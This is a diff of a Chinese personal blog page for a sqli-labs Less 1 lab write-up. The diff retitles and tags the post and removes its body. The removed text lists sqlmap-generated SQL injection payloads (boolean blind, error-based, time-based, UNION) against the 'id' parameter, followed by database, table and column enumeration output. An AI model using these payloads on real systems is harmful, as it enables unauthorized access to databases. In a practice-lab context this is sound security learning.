@@ -4,15 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQli-lab test1, 是小竹不是小猪">
-    <meta name="description" content="Sqli-lab less1一、使用手动注入
-
-
-
-二、使用SQLmap自动注入
-
-Parameter: id (GET)   （id是自行输入的）Type: boolean-based blind（布尔型盲注）
-Title: AND bo">
+    <meta name="keywords" content="sqli-labs Less 1 解题记录, 是小竹不是小猪">
+    <meta name="description" content="sqli-labs Less 1 解题记录 | 是小竹不是小猪">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -24,7 +17,7 @@ Title: AND bo">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQli-lab test1 | 是小竹不是小猪</title>
+    <title>sqli-labs Less 1 解题记录 | 是小竹不是小猪</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -316,12 +309,12 @@ Title: AND bo">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQli-lab test1</h1>
+                    <h1 class="description center-align post-title">sqli-labs Less 1 解题记录</h1>
                 </div>
             </div>
         </div>
@@ -435,9 +428,17 @@ Title: AND bo">
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">安全</span>
+                            </a>
+                        
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -470,32 +471,7 @@ Title: AND bo">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Sqli-lab-less1"><a href="#Sqli-lab-less1" class="headerlink" title="Sqli-lab less1"></a>Sqli-lab less1</h1><p>一、使用手动注入</p>
-<p><img src="/2022/01/20/a0121/1.PNG" alt="1"></p>
-<p><img src="/2022/01/20/a0121/2.PNG" alt="2"></p>
-<p><img src="/2022/01/20/a0121/3.PNG" alt="3"></p>
-<p>二、使用SQLmap自动注入</p>
-<p><img src="/2022/01/20/a0121/4.PNG" alt="4"></p>
-<p>Parameter: id (GET)   （id是自行输入的）<br>Type: boolean-based blind（布尔型盲注）</p>
-<p>Title: AND boolean-based blind - WHERE or HAVING clause<br>Payload: id=1’ AND 9221=9221 AND ‘YRWf’=’YRWf</p>
-<p>Type: error-based  （错误型注入）<br>Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)<br>Payload: id=1’ AND GTID_SUBSET(CONCAT(0x7178707871,(SELECT (ELT(5896=5896,1))),0x7171627671),5896) AND ‘opdu’=’opdu</p>
-<p>Type: time-based blind   （时间型注入）<br>Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>Payload: id=1’ AND (SELECT 5511 FROM (SELECT(SLEEP(5)))MpVh) AND ‘RrOv’=’RrOv</p>
-<p>Type: UNION query     （联合查询注入）<br>Title: Generic UNION query (NULL) - 3 columns<br>Payload: id=-5610’ UNION ALL SELECT NULL,NULL,CONCAT(0x7178707871,0x51697a4c41764d506b4a5067716d4b6747777a52774973585a4a7948414954716e74494276446349,0x7171627671)– -</p>
-<p><img src="/2022/01/20/a0121/5.PNG" alt="5"></p>
-<p>爆库名称</p>
-<p>available databases [13]:<br>[<em>] challenges<br>[</em>] chuanda<br>[<em>] chuanda2<br>[</em>] ctf<br>[<em>] dvwa<br>[</em>] information_schema<br>[<em>] mycake<br>[</em>] mysql<br>[<em>] performance_schema<br>[</em>] scu<br>[<em>] security<br>[</em>] sys<br>[*] vue</p>
-<p><img src="/2022/01/20/a0121/6.PNG" alt="6"></p>
-<p>爆表名</p>
-<p>Database: security<br>[4 tables]<br>+———-+<br>| emails   |<br>| referers |<br>| uagents  |<br>| users    |<br>+———-+</p>
-<p><img src="/2022/01/20/a0121/7.PNG" alt="7"></p>
-<p>爆字段</p>
-<p>Database: security<br>Table: users<br>[3 columns]<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| id       | int(3)      |<br>| password | varchar(20) |<br>| username | varchar(20) |<br>+———-+————-+</p>
-<p><img src="/2022/01/20/a0121/8.PNG" alt="8"></p>
-<p>爆数据</p>
-<p><img src="/2022/01/20/a0121/9.PNG" alt="9"></p>
-<p>思考哪些地方存在sql注入</p>
-<p>一些动态网站 .php .jsp .asp 后缀网站，如果是html一定没有</p>
-
+                
                 
             </div>
             <hr/>
@@ -558,7 +534,15 @@ Title: AND bo">
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">安全</span>
+                                </a>
+                            
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -736,9 +720,9 @@ Title: AND bo">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="sql注入总结">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="SQL 注入攻击总结">
                         
-                        <span class="card-title">sql注入总结</span>
+                        <span class="card-title">SQL 注入攻击总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -760,6 +744,18 @@ Title: AND bo">
                     </div>
                 </div>
                 
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">安全</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
+                </div>
+                
             </div>
         </div>
         
@@ -773,9 +769,9 @@ Title: AND bo">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="fabric2.2 test-network测试网络">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Fabric 2.2 test-network 测试网络搭建">
                         
-                        <span class="card-title">fabric2.2 test-network测试网络</span>
+                        <span class="card-title">Fabric 2.2 test-network 测试网络搭建</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -795,6 +791,14 @@ Title: AND bo">
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">
+                        <span class="chip bg-color">区块链</span>
+                    </a>
+                    
                 </div>
                 
             </div>
